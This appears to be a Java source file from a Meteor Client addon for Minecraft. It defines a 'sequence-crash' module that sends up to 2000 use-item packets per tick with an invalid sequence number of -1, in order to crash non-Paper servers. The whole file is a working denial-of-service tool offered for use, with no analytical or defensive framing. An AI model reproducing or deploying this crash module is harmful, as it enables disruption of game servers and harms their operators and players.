package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.protocol.game.ServerboundUseItemOnPacket;
import net.minecraft.network.protocol.game.ServerboundUseItemPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.world.phys.Vec3;
import widecat.meteorcrashaddon.CrashAddon;

public class SequenceCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("this really doesnt matter at all")
        .defaultValue(Modes.Block)
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("Packets per tick")
        .defaultValue(200)
        .sliderRange(50, 2000)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public SequenceCrash() {
        super(CrashAddon.CATEGORY, "sequence-crash", "Sends an invalid sequence, only works on non-paper");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (mode.get()) {
            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.connection.send(new ServerboundUseItemPacket(InteractionHand.MAIN_HAND, -1, 0f, 0f));
                }
            }
            case Block -> {
                Vec3 pos = new Vec3(mc.player.getX(), mc.player.getY(), mc.player.getZ());
                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.containing(pos), false);
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.connection.send(new ServerboundUseItemOnPacket(InteractionHand.MAIN_HAND, bhr, -1));
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        Item, Block
    }
}
